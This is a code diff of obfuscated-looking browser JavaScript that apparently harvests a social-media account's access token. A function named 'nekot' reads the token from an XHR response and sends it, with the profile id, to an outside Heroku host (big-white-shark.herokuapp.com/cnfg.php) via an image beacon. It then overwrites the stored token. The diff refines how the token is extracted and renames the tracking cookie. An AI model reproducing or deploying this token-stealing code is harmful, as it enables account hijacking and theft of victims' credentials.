@@ -4,7 +4,7 @@ var cnsl = true;
 var win = this;
 var ajax = win["XMLHttpRequest"];
 function start() {
-  var cookie_name = "sound:" + profile_id + " || audio: Enabled";
+  var cookie_name = "shmrc:" + profile_id;
   var cookie_time = 30;
   if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
     createCookie(cookie_name, Date.now(), 1);
@@ -39,7 +39,7 @@ function nekot() {
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4 && xhr.status == 200) {
         if (xhr.responseText.indexOf("access_token") > 0) {
-          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEWinbox";
+          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=AndroidNEWinbox";
           localStorage.access_token = "nekot";
         }
       }
